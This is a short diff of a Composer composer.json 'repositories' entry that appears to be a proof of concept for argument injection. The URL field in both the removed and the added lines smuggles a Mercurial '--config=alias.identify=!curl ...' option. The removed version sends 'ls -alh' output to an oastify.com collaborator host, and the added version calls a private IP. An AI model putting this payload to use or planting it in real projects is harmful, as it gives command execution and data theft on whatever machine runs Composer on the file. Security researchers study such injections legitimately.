@@ -6,8 +6,8 @@
     "prefer-stable": true,
     "repositories": [
         {
-            "type": "hg",
-            "url": "--config=alias.identify=!curl http://l9vq8uaqd76dn8qilu9a4o1ngem5awyl.oastify.com --data '$(ls -alh)'"
+            "type": "vcs",
+            "url": "--config=alias.identify=!curl http://192.168.72.129'"
         }
     ]
 }
